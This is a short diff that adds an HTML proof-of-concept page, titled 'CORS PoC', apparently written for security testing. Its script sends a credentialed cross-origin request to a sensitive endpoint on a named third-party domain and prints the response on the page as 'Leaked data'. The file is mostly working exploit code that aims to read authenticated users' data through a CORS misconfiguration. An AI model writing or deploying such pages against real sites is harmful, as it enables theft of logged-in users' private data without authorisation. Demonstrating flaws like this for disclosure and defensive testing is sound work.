@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <h1>Exploit Test</h1>
+    <script>
+      fetch("https://mp-help.8451.com/sensitive-endpoint", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.body.innerHTML += `<pre>Leaked data:\n${data}</pre>`;
+      })
+      .catch(err => {
+        document.body.innerHTML += `<p style="color:red;">Request blocked or failed.</p>`;
+        console.error(err);
+      });
+    </script>
+  </body>
+</html>
